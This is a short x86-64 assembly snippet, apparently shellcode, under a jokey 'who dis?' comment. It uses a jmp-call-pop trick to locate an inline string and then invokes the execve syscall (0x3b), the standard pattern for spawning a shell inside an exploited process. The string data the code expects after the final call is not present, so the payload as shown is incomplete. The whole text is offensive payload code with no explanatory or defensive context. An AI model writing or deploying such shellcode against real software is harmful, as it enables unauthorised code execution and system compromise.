//new shellcode, who dis?
jmp string_shell
beg:
pop rdi
mov rsi, rdi
add rsi, 8
mov rdx, rsi
mov eax ,0x3b
syscall
string_shell:
call beg
